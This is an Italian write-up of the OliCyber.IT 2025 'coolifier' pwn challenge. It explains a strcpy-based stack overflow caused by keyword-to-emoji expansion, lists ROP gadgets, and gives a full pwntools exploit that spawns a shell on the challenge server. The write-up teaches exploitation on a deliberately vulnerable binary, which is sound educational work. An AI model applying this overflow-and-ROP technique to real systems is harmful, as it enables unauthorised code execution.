# OliCyber.IT 2025 - Competizione nazionale

## [pwn] coolifier (23 solves)

Rendi i tuoi testi noiosi molto più cool!

`nc coolifier.challs.olicyber.it 38068`

Author: Giulia Martino <@Giulia>

## Panoramica

Il binario chiede all'utente la lunghezza di un messaggio e un messaggio. Poi “coolifica” il messaggio cercando una lista predefinita di parole chiave e sostituendole con le relative stringhe. Un banner stampato all'avvio mostra la mappatura tra le parole chiave e le loro sostituzioni. Una di queste sostituzioni è la stringa `/bin/sh`, un dettaglio importante per l'exploit. Il binario non è stripato, non ha canary e non è PIE.

## Soluzione

La funzione `coolify` è quella responsabile della trasformazione dell'input e contiene il bug. La funzione esegue i seguenti passaggi:

1. Itera sull'input byte per byte.
2. Per ogni posizione, controlla se l'input corrisponde a una delle parole chiave predefinite.
3. Se trova una corrispondenza, usa `strcpy` per copiare la stringa di sostituzione corrispondente in un buffer di output.
4. Altrimenti, copia semplicemente il byte corrente.

È importante notare che:

- I buffer di input e output sono entrambi allocati nello stack con una dimensione di 0x100 byte.
- La funzione usa un contatore (basato sulla lunghezza dell'input) per decidere quanti caratteri processare.
- Non c'è un controllo corretto dei limiti sul buffer di output quando una parola chiave viene sostituita: la stringa emoji viene copiata usando la funzione `strcpy`; quindi, se la stringa di sostituzione è più lunga della parola chiave, l'output può crescere oltre il limite di 256 byte.

In particolare, la 13esima parola chiave `iamabear!`, lunga 10 byte, corrisponde all'emoji `\\_ʕ•ᴥ•ʔ_/`, lunga 18 byte. Questo significa che ogni volta che la stringa `iamabear!` è usata nell'input dell'utente, l'output sarà più lungo di 8 byte. Questo può essere usato per causare un buffer overflow sullo stack.

Dato che non c'è canary e il binario non è PIE, un modo diretto per ottenere la flag è sovrascrivere l'indirizzo di ritorno nello stack con una ROP chain per ottenere una shell. I requisiti sono:

- rax = 0x3b
- rdi = indirizzo di `/bin/sh`
- rsi = 0x0
- rdx = 0x0
- syscall

Tutti i gadget necessari sono stati inseriti volutamente nel binario e possono essere trovati ispezionandolo con uno strumento come `ropper` o `ROPGadgets`:

```console
➜  ropper -f build/coolifier
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

[...]
0x00000000004011bd: pop rax; sub rax, 0x37; ret;
0x00000000004011a6: pop rdi; add rdi, 8; ret;
0x00000000004011b4: pop rdx; xor rdx, 0x37; ret;
0x00000000004011af: pop rsi; ret;
[...]
0x00000000004011c6: syscall;
[...]

```

I gadget che poppano `rax`, `rdi` e `rdx` contengono una seconda istruzione che esegue un'operazione aggiuntiva su di essi, ma possono essere facilmente annullati invertendo l'operazione nel valore caricato con `pop`.

La stringa `/bin/sh` è già presente nel binario come una delle stringhe di sostituzione.

Quindi, la strategia dell'exploit è:

1. Inviare un numero sufficiente di stringhe `iamabear!` per causare un buffer overflow nello stack abbastanza grande da contenere l'intera ROP chain.
2. Riempire i byte rimanenti con caratteri `cyclic` (fino a 0xff, che è il massimo input accettato dalla challenge).
3. Trovare l'offset dell'indirizzo di ritorno facendo crashare il programma in un debugger e controllando l'indirizzo di ritorno: `cyclic_find(0x6165616161616161, n=8) = 26`.
4. Aggiornare il payload in modo che contenga il giusto numero di byte di offset e poi aggiungere la ROP chain completa.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *
import os


HOST = os.environ.get("HOST", "coolifier.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 1337))

exe_name = os.path.join(os.path.dirname(__file__), 'coolifier')
exe = context.binary = ELF(exe_name, checksec=False)

POP_RAX = 0x00000000004011bd # pop rax; sub rax, 0x37; ret;
POP_RDI = 0x00000000004011a6 # pop rdi; add rdi, 8; ret;
POP_RDX = 0x00000000004011b4 # pop rdx; xor rdx, 0x37; ret;
POP_RSI = 0x00000000004011af # pop rsi; ret;
SYSCALL = 0x00000000004011c6 # syscall;
BIN_SH = 0x4020bd

io = remote(HOST, PORT)

ropchain = p64(POP_RDI)
ropchain += p64(BIN_SH - 8)
ropchain += p64(POP_RSI)
ropchain += p64(0)
ropchain += p64(POP_RDX)
ropchain += p64(0x37)
ropchain += p64(POP_RAX)
ropchain += p64(0x3b + 0x37)
ropchain += p64(SYSCALL)

N_OVERFLOWS = 14

payload = b"iamabear!" * N_OVERFLOWS
payload += b"A" * cyclic_find(0x6165616161616161, n=8)
payload += ropchain

io.sendlineafter(b"Message length: ", str(len(payload)).encode())
io.sendafter(b"Message: ", payload)
io.recvline()

io.sendline(b"cat flag")
res = io.clean(1)

if b"flag{" not in res:
    print("nope ->", res)
else:
    flag = "flag{" + res.split(b"flag{")[1].split(b"}")[0].decode() + "}"
    print(flag)

io.close()

```
